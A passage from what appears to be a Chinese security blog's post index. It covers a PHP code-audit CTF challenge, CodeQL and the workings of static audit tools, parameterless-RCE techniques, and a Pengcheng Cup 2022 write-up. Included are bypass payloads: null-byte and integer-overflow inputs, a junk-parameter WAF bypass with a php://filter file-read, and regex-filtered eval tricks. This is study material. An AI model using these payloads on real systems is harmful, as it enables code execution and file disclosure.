\n\n接下来来了两个foreach循环\n用foreach循环遍历$_GET和$_POST数组，将参数值去除首尾空格，并且使用addslashes()函数将参数值中的特殊字符进行转义，以防止SQL注入等攻击\n其实这里就要有一个思想，get，post传参传进来的东西，都可以当作数组处理\n\nfunction is_palindrome_number($number) &#123;     $number = strval($number); //strval — 获取变量的字符串值    $i = 0;     $j = strlen($number) - 1; //strlen — 获取字符串长度    while($i &lt; $j) &#123;         if($number[$i] !== $number[$j]) &#123;             return false;         &#125;         $i++;         $j--;     &#125;     return true; &#125; \n\n这是一个回文串检测的函数，emmmm，这么简单就不解释了吧\nif(is_numeric($_REQUEST[&#x27;number&#x27;])) //is_numeric — 检测变量是否为数字或数字字符串 &#123;    $info=&quot;sorry, you cann&#x27;t input a number!&quot;; &#125;\n\nelseif($req[&#x27;number&#x27;]!=strval(intval($req[&#x27;number&#x27;]))) //intval — 获取变量的整数值&#123;      $info = &quot;number must be equal to it&#x27;s integer!! &quot;;   &#125;\n\n这里是把输入转换为数字又变为字符串，再比较，检查其是否为一个合法的整数。如果输入不是整数，则会将 $info 变量设置为错误消息字符串。\n代码很复杂我们进行一下简化，再把思路整合一下\n$info = &quot;&quot;; $req = [];$flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;//三个变量if(!isset($_GET[&#x27;number&#x27;]))//number参数得有if(is_numeric($_REQUEST[&#x27;number&#x27;])) //is_numeric — 检测变量是否为数字或数字字符串 $req[&#x27;number&#x27;]!=strval(intval($req[&#x27;number&#x27;]))//判断为整数$value1 = intval($req[&quot;number&quot;]);$value2 = intval(strrev($req[&quot;number&quot;]));  //两个变量，反转字符串if($value1!=$value2)&#123;          $info=&quot;no, this is not a palindrome number!&quot;;     &#125;    //要相等if(is_palindrome_number($req[&quot;number&quot;]))//回文判断\n\n好了好了，关键过滤点我们都知道了。\n首先我们需要输入一个参数number,这number不能是数字或者数字字符串，但是又得是整数，他是回文数，又不能是回文数。阿哲。\n\n很离谱，我们想想绕过吧\n首先最简单的is_number()函数的绕过可以利用空字符截断%00\nis_numeric函数对于空字符%00判断为非数值，绕过第一个条件。函数判断为非数值，但又不影响它值的构造，理所当然想到空格字符%20和空字符%00。\n\n可以看到是可以绕过的\n还有回文\n这里附上p神文章https://www.leavesongs.com/PENETRATION/some-sangebaimao-ctf-writeups.html#phpfuzz\n这里p神教了我们三种方法\nintval系统限制简单来说就是intval把变量转换为整数但他有极限，32位下-2147483648到 2147483647。\n64下\n最大为9223372036854775807。也就是说，当我们输入92233720368547758070这种大于极限的数字，就是会返回\n9223372036854775807也就是他的极限。\n\n那结合之前的绕过我们的payload就有了，思路就是输入一个本身和回文都大于极限的数，他们就相等了\n总结一下\n$req[‘number’]!&#x3D;strval(intval($req[‘number’]))这里是我们做文章要绕过的点，用我们的payload需要让这个成立，所以必须用09223372036854775807，为什么自己去理解\nfunction is_palindrome_number($number) &#123;     $number = strval($number); //strval — 获取变量的字符串值    $i = 0;     $j = strlen($number) - 1; //strlen — 获取字符串长度    while($i &lt; $j) &#123;         if($number[$i] !== $number[$j]) &#123;             return false;         &#125;         $i++;         $j--;     &#125;     return true; &#125; \n\n这个函数一个字符一个字符比较，我们不去管\n最终payload\nhttp://localhost/php_bugs-master/02.php/?number=%0009223372036854775807\n\n\nhttp://localhost/php_bugs-master/02.php/?number=%001000000000000000.00000000000000010\n还有其他的一些东西可以看p神\n03 多重加密","categories":["代码审计"],"tags":["代码审计","PHP"]},{"title":"关于codeql的一些思考和学习","url":"/2023/05/06/%E5%85%B3%E4%BA%8Ecodeql%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83%E5%92%8C%E5%AD%A6%E4%B9%A0/","content":"前言想做一个代码审计的工具，查了查网上的资料，发现前沿一点的是一个叫codeql的一个技术，是一种数据库的东西，而且好像还是开源的。于是想来学习一下\ncodeql工作流程\n(图片来源：https://blog.semmle.com/introduction-to-variant-analysis-part-2/)\ncodeql整体思路是把我们想要审计的代码转换为一个可查询的数据库，有点神奇了起来。\n\n通过 Extractor 模块对源代码工程进行关键信息分析提取，构成一个关系型数据库。\ncodeql是自己搞得关系型数据库\n转换成数据库，得思考他转换成什么？\n这里对于不同的类型的语言他有不同的处理方式\n编译型Extrator模块监控编译过程，收集源码相关信息，得到其中的:AST,语义信息，控制流数据流等等，同时复制一份源码文件\n解释型Extrator模块直接分析源码\n这里我注意到EXtrator模块很牛哈\n我chatgpt一手\nCodeQL 中的 Extractor 模块是用于将源代码转换为 CodeQL 数据库的工具。它的主要工作原理是将源代码解析为抽象语法树（AST），然后使用 CodeQL 中预定义的语言规范将 AST 转换为具有关系的数据库模型。Extractor 可以识别多种编程语言中的代码，包括 C，C++，Java，Python，Go 等等。\nExtractor 还支持自定义解析器和外部语言规范，以便支持其他编程语言或特定的代码风格。例如，如果你的代码使用了一些非标准的语言特性或自定义的库，你可以通过定义自己的解析器和语言规范来使 Extractor 能够解析你的代码。\n总之，Extractor 模块的工作原理是将源代码转换为 CodeQL 数据库，它是 CodeQL 分析过程的第一步，为后续的分析提供了一个可查询的数据模型。\n牛的\n做完分析所有的数据会导入到CodeQL database这个文件夹，其中包括了源代码文件、关系数据、语言相关的 database schema（schema 定义了数据之间的相互关系）。\ncodeql自定义了一套名为QL的查询语言并提供了相应的支持库和运行环境。最终将查询结果返回给用户，方便用户进一步的审计\n项目构成codeql-cli-binaries 工程是 CodeQL 的命令行工具，实现了 CodeQL 的大部分核心功能，包括 Extractor（不同目标语言对应着不同的 Extractor）、中间语言转换、AST 提取、控制流分析、数据流分析等，这个工程的核心模块都只提供 binary，并不开放源代码。\nql 工程是 QL 查询语言的实现，QL 是一种面向对象的高级语言，其支持库中封装了程序分析所需的所有对象及常用方法。\n另外还有两个不太重要工程：\nvscode-codeql:https://github.com/github/vscode-codeql\nvscode-codeql-starter：https://github.com/github/vscode-codeql-starter\nvscode-codeql 是 CodeQL 的 VS Code 插件，它主要是为了方便在 VS Code 做结果展示用的; vscode-codeql-starter 工程是配合 VS Code 使用的一个 Workspace，它主要是为了方便配置，用户也完全可以自己配置 Workspace。\n这里配上他人的总结\n\nCodeQL 的这些能力是它独有的吗？当然不是。白盒代码审计并不是新的领域，业界已经有非常多的工具。老牌商业软件如 Fortify SCA, Coverity，开源工具更多，各大互联网公司也都会建设自己的源代码安全审计平台，这里就不一一列举了。以 Fortify 为例， 其产品白皮书中就说明了它的五大主要分析引擎：数据流、语义、结构、控制流、配置流。各家也都在做，学术界研究的也不少。\nCodeQL 有什么优势？简单说就是免费、开源、Semmle 团队强大的研究能力。Semmle 孵化于牛津大学, 其投资者包括 Google, Microsoft, NASA 等，现在又加入了 Github，这样闪光的履历其实也是能力的背书。具体讲，CodeQL 的基础功能扎实，迭代迅速，又不断有研究员发高水平的文章，这些都是它的优势。\nCodeQL 能给白盒领域带来突破性的发展吗？这个不一定。从本文的漏洞实例分析中你也可以看出，白盒审计最重要的能力是对安全模型的认识和对分析目标的理解。傻瓜一键式的工具是不存在的，或者换种说法，简单问题现有工具就能解决了。所以核心还是人。\nCodeQL 对我们有什么价值？分两方面。对个人而言，意味者被赋能了更复杂的代码分析能力。越是困难的问题，基础工具的能力越是重要，这在各个领域都是相通的。比如在二进制软件分析领域，近年来在 Intel PT 技术等基础能力的加持下，就有了非常迅速的发展。对企业而言，目前互联网公司的白盒代码审计多是采用采购商业软件 + 自研工具的方式，那我认为 CodeQL 当然是一个很重要的技术选型目标。\nCodeQL 更适用于哪些场景？更适用于对复杂安全问题的建模。Fortify 之类的老牌商业软件更重要的是它的规则库，更适合做大规模、通用型问题的扫描。CodeQL 当然也可以这样用，但我认为它更适合的场景是做复杂安全问题的建模，在对审计目标有足够理解的基础之上做针对性的安全分析。\n\n于我而言，codeql的核心技术不开源没有源码还是我很难受的一个点，笔者现在也在思考是否做一个只能基于他的binary的工具，其实还是不愿意的。\n参考文章：https://lennysec.github.io/codql-and-cve-2019-3560/\n","categories":["代码审计"],"tags":["代码审计","codeql"]},{"title":"代码审计漫谈","url":"/2023/05/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%AB%E8%B0%88/","content":"前言因为自己想做一个代码审计工具，自己之前是有做过一点点代码审计的。审计过熊海，bluecms等等简单的一些cms。但是对其中的很多深层次原理都不了解。甚至可以说一点点都不懂，毕竟从用一个工具到做一个工具就是有本质上的区别。\n于我而言，做一个工具肯定是有很大的提升的。对于这个工具的构想，其实目标很简单，是想做出一款可以有多语言的，简洁的，几乎没有误报和漏报的一款简洁的代码审计工具(注意是几乎)。当然这个是很困难的QAQ。\n然后在写了一版申报书之后，发现自己想的太多了。这样一个大的项目以我本科生的水平几乎就是不可能完成的。所以呀，饭还是得一口一口吃。\n\n根据老师的一些建议，现在想的是如何从一个小的点上有所突破，做一个小而精的工具。我想这是我可以做到的\n一些概念其实一个好用的工具，最简单的标准就是自动化。不要当每一个人都是技术大牛，就算是技术大牛，有简单的工具我相信也没有人会去用复杂的工具\n所以自动化一定是最基础的要求点\n那怎么做到自动化，要有两个词的概念理解\n1.漏报率没有发现的bug\n2.误报率发现了错误的bug\n自动化代码审计工具正常来说都是我们给他一段代码，他给我们审计结果。这个结果中，里面这两个点就是绕不过的点。其实我之前的想法，什么深度学习，什么语法规则等等巴拉巴拉的东西，都是想为这两个点去服务。\n我们从深层原理去看看，为什么会出现这两个问题，也就是市面上的软件为什么也一直解决不了这个问题\n我们简单的把代码审计工具分为两类一类是动态的代码审计工具，一类是静态的代码审计工具\n动态代码审计工具这种工具基于代码运行的过程中处理挖掘漏洞一般称为IAST（interactive Application Security Testing）\n里面一般包含两个技术点\n1.hook在软件开发中，Hook是指在程序运行时，通过修改函数调用表（或者函数指针）的方法，使得程序在执行特定函数时，会先执行Hook函数，从而可以监控、修改或者替换原有函数的行为。在安全领域，攻击者可以使用Hook技术，将恶意代码注入到受攻击程序的运行过程中，从而获取敏感信息或者控制程序行为。\n2.前端爬虫在前端爬虫中，爬虫程序会模拟浏览器行为，对目标网站进行访问，并收集需要的数据。恶意攻击者可以使用Hook技术，监控网页中的某些函数调用。\n这里附上一张流程图\n\n我们通过前端爬虫模仿浏览器访问，同时使用hook，修改程序的执行流，如果如果Hook函数被触发，并满足某种条件，那么我们认为该漏洞存在。\n这类扫描工具的优势在于，通过这类工具发现的漏洞误报率比较低，且不依赖代码，一般来说，只要策略足够完善，能够触发到相应恶意函数的操作都会相应的满足某种恶意操作。而且可以跟踪动态调用也是这种方法最主要的优势之一。\n但是也有缺点\n(1) 前端Fuzz爬虫可以保证对正常功能的覆盖率，却很难保证对代码功能的覆盖率。如果曾使用动态代码审计工具对大量的代码扫描，不难发现，这类工具针对漏洞的扫描结果并不会比纯黑盒的漏洞扫描工具有什么优势，其中最大的问题主要集中在功能的覆盖度上。\n一般来说一个项目的代码是会有冗余的。也有很多开发人员也没想到的东西。有太多的代码不会从功能处发现，这样的检测就会有很高漏报率。\n(2) 动态代码审计对底层以及hook策略依赖较强，这里有很多问题。比如我们如果想要依赖IAST来做代码审计工具，我们的核心点就是要设计很多很多的hook方案，但是如果hook的深度不够，我们也不能执行我们的恶意代码，不能判断这里有漏洞。（漏报）还有也不是触发了恶意函数就可以判断有漏洞，比如有一个echo可以执行，不能直接判断为xss。同时由于需要运行，环境，执行效率等等都是很大很大的问题，这样也只能审计单一语言。多语言几乎是海量的工作量，所以现在的代码审计工具基本已经很少完全使用IAST了\n静态代码审计工具静态代码审计主要是通过分析目标代码，通过纯静态的手段进行分析处理，并挖掘相应的漏洞&#x2F;Bug.\n其实就是简单的人工读代码变成了机器读代码\n最基础的东西，也是最早或者说是最容易想到的方法\n正则匹配\n\n虽然我们匹配到了这个简单的漏洞，但是很快发现，事情并没有那么简单。\n\n但是这样永远没有尽头，你说用正则过滤过滤输入还是有用的，但是我们要去匹配代码，不可能完全覆盖，你永远不知道一些牛鬼蛇神怎么写代码\n于是有两种思路\n1.高覆盖性这类工具最经典的就是Seay，通过简单的关键字来匹配经可能多的目标，之后使用者可以通过人工审计的方式进一步确认。\n\\beval\\b\\(\n\n2.高可用性这类工具最经典的是Rips免费版\n\\beval\\b\\(\\$_(GET|POST)\n\n用更多的正则来约束，用更多的规则来覆盖多种情况。这也是早期静态自动化代码审计工具普遍的实现方法。\n但问题显而易见，高覆盖性和高可用性是这种实现方法永远无法解决的硬伤，不但维护成本巨大，而且误报率和漏报率也是居高不下。所以被时代所淘汰也是历史的必然。\n但是现在seay和rips依旧是主流软件，有人可能会问为什么，因为要其他钱啊！（开玩笑）\n再牛逼一点点AST!!!\nAST（Abstract Syntax Tree，抽象语法树）是一种用于表示程序源代码语法结构的树状数据结构。在编译器、解释器等程序分析工具中，AST通常是从源代码中生成的一种中间表示形式，用于对程序进行分析、优化、转换等操作。\nAST通常由一系列节点组成，每个节点表示源代码中的一个语法结构，例如函数、变量声明、表达式、控制流语句等。节点之间通过父子关系组织成一棵树，每个节点包含了语法结构的信息，例如标识符、运算符、字面量等。\nAST可以被用于各种程序分析和转换任务中，例如语法检查、编译优化、代码重构、程序理解和分析等。在编译器中，AST通常是编译过程中的一个重要中间表示形式，被用于生成目标代码。在静态分析工具中，AST可以被用于检查和修复代码中的各种问题，例如潜在的安全漏洞、性能瓶颈、代码风格问题等。\nAST在许多编程语言的编译器和解释器中都得到了广泛的应用，以下是一些使用AST的编程语言：\n\nC&#x2F;C++：GCC、Clang等编译器使用AST作为中间表示形式，用于编译、优化和代码生成。\nJava：Java编译器使用AST作为中间表示形式，用于语法检查、编译优化和代码生成。\nPython：Python解释器和静态分析工具使用AST进行代码检查、代码重构和性能优化。\nJavaScript：JavaScript解释器和编译器使用AST进行代码分析、优化和转换。\nRuby：Ruby解释器和编译器使用AST进行代码分析、优化和转换。\nGo：Go编译器使用AST作为中间表示形式，用于编译、优化和代码生成。\n\n除此之外，许多其他编程语言的编译器和解释器也采用了AST作为中间表示形式，以便于对程序进行分析和优化。\n看完这个概念大家有没有什么想法？再直观一点\n以php为例\n\n没错，我们只需要在AST上做文章，有了统一的AST语法树，上面的问题迎刃而解\n现在如何对AST语法树做分析也就成了我们这个工具最大的问题\n在理解如何分析AST语法树之前，我们首先要明白information flow、source、sink三个概念，\n\nsource： 我们可以简单的称之为输入，也就是information flow的起点\nsink： 我们可以称之为输出，也就是information flow的终点\n\n而information flow，则是指数据在source到sink之间流动的过程。\n也就是信息流分析\n把这个概念放在PHP代码审计过程中，Source就是指用户可控的输入，比如$_GET、$_POST等，而Sink就是指我们要找到的敏感函数，比如echo、eval，如果某一个Source到Sink存在一个完整的流，那么我们就可以认为存在一个可控的漏洞，这也就是基于information flow的代码审计原理。\n举个例子：\n\n\n这么一段代码生成的AST是什么捏\n\n也很简单\n在上面的分析过程中，Sink就是eval函数，source就是$_GET，通过逆向分析Sink的来源，我们成功找到了一条流向Sink的information flow，也就成功发现了这个漏洞。\n\n在分析information flow中明确作用域是基础中的基础\n如果我们只关注左值和右值的回溯\n\n我们会得到这样的结果\n但是这里有个get函数\n\n这样才是正确的流程\n所以我们的分析过程中作用域很重要\n在这段代码中，从主语法树的作用域跟到Get函数的作用域，如何控制这个作用域的变动，就是基于AST语法树分析的一大难点，当我们在代码中不可避免的使用递归来控制作用域时，在多层递归中的统一标准也就成了分析的基础核心问题。\n可是！\n\n还是有问题\n\n这样一段代码\n我们怎么分析\n应该说机器怎么分析\n逆向分析可以解决这个代码\n\n看到这里的分析，我们新建了一个规则作用于一个作用域。越来越复杂了。\n可能到现在你觉得我讲的有点懵、\n就是我们需要发现危险函数，但是AST的作用域就是程序的作用域，我们一但跳出一个函数就要建立新的规则，也就是说，每来一个作用域，我们都要新建立规则\n很复杂了吧，但是可以解决\n但是来个简单的\n\n这几乎是一个没有漏洞的代码，因为被过滤了\n但是AST不行\n这是一个典型的全局过滤，人工审计可以很容易看出这里被过滤了。但是如果在自动化分析过程中，当回溯到Source为$_GET[&#39;a&#39;]时，已经满足了从Source到sink的information flow。已经被识别为漏洞。一个典型的误报就出现了。\n而基于AST的自动化代码审计工具也正是在与这样的问题做博弈，从PHP自动化代码审计中比较知名的Rips、Cobra\n都是在不同的方式方法上，优化information flow分析的结果，而最大的区别则是离不开的高可用性、高覆盖性两点核心\n对于基于AST的代码分析来说，最大的挑战在于没人能保证自己完美的处理所有的AST结构，再加上基于单向流的分析方式，无法应对100%的场景，这也正是这类工具面临的问题（或者说，这也就是为什么选择逆向的原因）。\n所以呀，逆向很重要\nemmmm看来到目前也没有很好的解决方法\n还有基于IR&#x2F;CFG的分析AST是一个中间树，还有别的吗，答案是肯定的\nAST是编译原理中IR&#x2F;CFG的更上层\n也就是说，分析AST更接近分析代码，换句话就是说基于AST的分析得到的流，更接近脑子里对代码执行里的流程，忽略了大多数的分支、跳转、循环这类影响执行过程顺序的条件，这也是基于AST的代码分析的普遍解决方案，当然，从结果论上很难辨别忽略带来的后果。所以基于IR&#x2F;CFG这类带有控制流的解决方案，是现在更主流的代码分析方案，但不是唯一。\n什么是IR&#x2F;CFGIR（Intermediate Representation，中间表示）是一种高级语言和机器语言之间的抽象表示形式，通常是一种低级别的、机器无关的表示形式。IR可以作为编译器的一个重要中间表示形式，用于在源代码和目标代码之间进行转换和优化。IR通常是一种树状结构，包含了程序的控制流、数据流和操作等信息。\nCFG（Control Flow Graph，控制流图）是一种用于表示程序控制流的图形表示形式。CFG通过将程序的各个基本块（basic block）抽象为节点，将基本块之间的控制流关系抽象为有向边，从而形成一个图形结构。CFG可以用于描述程序的控制流结构，帮助程序员理解程序的执行过程，并在编译器中用于代码优化和转换。\n一般来说，我们需要遍历IR来生成CFG，其中需要按照一定的规则.当然，也可以用AST来生成CFG，毕竟AST是比较高的层级。\n而基于CFG的代码分析思路优势在于，对于一份代码来说，你首先有了一份控制流图（或者说是执行顺序），然后才到漏洞挖掘这一步。比起基于AST的代码分析来说，你只需要专注于从Source到Sink的过程即可。\n挑战的核心仍然维持在如何控制流，维持作用域，处理程序逻辑的分支过程，确认Source与Sink。\n理所当然的是，既然存在基于AST的代码分析，又存在基于CFG的代码分析，自然也存在其他的种类。比如现在市场上主流的fortify，Checkmarx，Coverity包括最新的Rips都使用了自己构造的语言的某一个中间部分，比如fortify和Coverity就需要对源码编译的某一个中间语言进行分析。前段时间被阿里收购的源伞甚至实现了多种语言生成统一的IR，这样一来对于新语言的扫描支持难度就变得大大减少了。\n新东西QLAST,CFG等其实本质上还是对于数据流的分析\n而QL就是把这个流的每一个环节具象化，把每个节点的操作具像成状态的变化，并且储存到数据库中。这样一来，通过构造QL语言，我们就能找到满足条件的节点，并构造成流。下面我举一个简单的例子来说：\n&lt;?php$a = $_GET[&#x27;a&#x27;];$b = htmlspecialchars($a);echo $b;\n\n我们简单的把前面的流写成一个表达式\necho =&gt; $_GET.is_filterxss\n\n这里is_filterxss被认为是输入$_GET的一个标记，在分析这类漏洞的时候，我们就可以直接用QL表达\nselect * where &#123;    Source : $_GET,    Sink : echo,    is_filterxss : False,&#125;\n\n我们就可以找到这个漏洞（上面的代码仅为伪代码），从这样的一个例子我们不难发现，QL其实更接近一个概念，他鼓励将信息流具象化，这样我们就可以用更通用的方式去写规则筛选。\n也就是更加的简单和方便\n也正是建立在这个基础上，CodeQL诞生了，它更像是一个基础平台，让你不需要在操心底层逻辑，使用AST还是CFG又或是某种平台，你可以将自动化代码分析简化约束为我们需要用怎么样的规则来找到满足某个漏洞的特征。这个概念也正是现代代码分析主流的实现思路，也就是将需求转嫁到更上层。\n参考文献：https://paper.seebug.org/1339/#_1\n","categories":["代码审计"],"tags":["代码审计"]},{"title":"无参数rce","url":"/2023/05/11/%E6%97%A0%E5%8F%82%E6%95%B0rce/","content":"前言在鹏程杯中发现有无参数rce，发现自己基础很差很差，特此学习记录一下。参考文文章：https://a1andns.github.io/post/%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCE\n使用无参数函数的原因这里是因为有很离谱的过滤\n原本正常来说我们看到eval($_POST[‘cmd’]);\n就可以传入利用了，但是这里前面加上了这样的过滤\nif(&#x27;;&#x27; === preg_replace(&#x27;/[^\\W]+\\((?R)?\\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;cmd&#x27;])) &#123;        eval($_GET[&#x27;cmd&#x27;]);&#125;\n\n\n(?R)?尤其注意这个特征点，是一个递归的匹配\n如果输入的是system(‘ls’)这样的有参数函数，正则匹配就会匹配不到，从而没有替换为空，那么&#x3D;&#x3D;&#x3D;’;’的条件就无法满足。\n只有a();、a(b(c()));这样的格式才能够被匹配。\n上面这个正则就是明显的过滤参数，只允许无参数函数的表现。\n超级全局变量PHP中预定义了几个超级全局变量（superglobals） ，这意味着它们在一个脚本的全部作用域中都可用。 你不需要特别说明，就可以在函数及类中使用。\nPHP 超级全局变量列表:$GLOBALS$_SERVER$_REQUEST$_POST$_GET$_FILES$_ENV$_COOKIE$_SESSION\n\n注意一个超级全局变量$_ENV\n这可以当作是一个环境变量的集合\n这里面有很多可以使用的无参函数\ngetenv()\narray_rand()\narray_filp()\n等等\n注意一个\ngetallheaders()\n这个可以获得所有的消息头信息\n&lt;?phpvar_dump(getallheaders());?&gt;结果：array(13) &#123;  [&quot;Content-Length&quot;]=&gt;  string(1) &quot;0&quot;  [&quot;Cookie&quot;]=&gt;  string(85) &quot;_ga=GA1.1.125883784.1603376093; Phpstorm-b0ddb94=486c1e0a-aca9-446a-ad57-e43c4cbfd510&quot;  [&quot;Accept-Language&quot;]=&gt;  string(47) &quot;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&quot;  [&quot;Accept-Encoding&quot;]=&gt;  string(17) &quot;gzip, deflate, br&quot;  [&quot;Sec-Fetch-Dest&quot;]=&gt;  string(8) &quot;document&quot;  [&quot;Sec-Fetch-User&quot;]=&gt;  string(2) &quot;?1&quot;  [&quot;Sec-Fetch-Mode&quot;]=&gt;  string(8) &quot;navigate&quot;  [&quot;Sec-Fetch-Site&quot;]=&gt;  string(4) &quot;none&quot;  [&quot;Accept&quot;]=&gt;  string(124) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;  [&quot;User-Agent&quot;]=&gt;  string(131) &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Edg/86.0.622.51&quot;  [&quot;Upgrade-Insecure-Requests&quot;]=&gt;  string(1) &quot;1&quot;  [&quot;Host&quot;]=&gt;  string(15) &quot;localhost:63342&quot;  [&quot;Content-Type&quot;]=&gt;  string(0) &quot;&quot;&#125;---------------------------------Author: A1andNSArticle is from: https://a1andns.github.io/post/%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0RCEThis content is shared under the CC BY-NC-SA 4.0 protocol (Non-Commercial)\n\n这样我们可以加入我们的恶意代码\n\n","categories":["知识总结"],"tags":["无参RCE"]},{"title":"鹏城杯2022","url":"/2023/05/09/%E9%B9%8F%E5%9F%8E%E6%9D%AF2022/","content":"[鹏城杯 2022]简单包含emmmm，应该是商用的最简单的waf，使用脏数据绕过\npayload：1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;flag=php://filter/convert.base64-encode/resource=flag.php\n\n\n用脏数据是waf绕过常用手段\n[鹏城杯 2022]简单的php&lt;?phpshow_source(__FILE__);    $code = $_GET[&#x27;code&#x27;];    if(strlen($code) &gt; 80 or preg_match(&#x27;/[A-Za-z0-9]|\\&#x27;|&quot;|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|&lt;|&gt;|\\$|\\?|\\^|&amp;|\\|/is&#x27;,$code))&#123;        die(&#x27; Hello&#x27;);    &#125;else if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\s\\(\\)]+?\\((?R)?\\)/&#x27;, &#x27;&#x27;, $code))&#123;        @eval($code);    &#125;?&gt; \n\n很明显的无字符rce\n虽然说之前总结了，但是这次实战还是写不出来\n\n再根据这道题总结一下\n参考文章：https://www.cnblogs.com/0xo0Kerk/p/17236536.htmlhttps://blog.csdn.net/Manuffer/article/details/120738755\n\n学习一下什么是无参数RCE，现在才明白RCE中好像有无参数和无字符\n&lt;?php\tif(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])&#123; \t\t     eval($_GET[&#x27;exp&#x27;]);\t&#125;?&gt;\n\n看下这段代码，\n一点一点进行审计。\n‘;’ &#x3D;&#x3D;&#x3D; preg_replace(‘&#x2F;[a-z,_]+((?R)?)&#x2F;‘这个如果对了，就执行 $_GET[‘exp’]，然后eval($_GET[‘exp’]);\n[a-z,_]匹配小写字母和下划线 +表示1到多个\n(?R)代表当前表达式，就是这个(&#x2F;[a-z,_]+((?R)?)&#x2F;)，所以会一直递归，?表示递归当前表达式0次或1次（若是(?R)*则表示递归当前表达式0次或多次，例如它可以匹配a(b(c()d()))）\n简单说来就是：这串代码检查了我们通过GET方式传入的exp参数的值，如果传进去的值是传进去的值是字符串接一个()，那么字符串就会被替换为空。如果（递归）替换后的字符串只剩下;,那么我们传进去的 exp 就会被 eval 执行。比如我们传入一个 phpinfo();，它被替换后就只剩下;，那么根据判断条件就会执行phpinfo();。\n(?R)?能匹配的只有a(); a(b()); 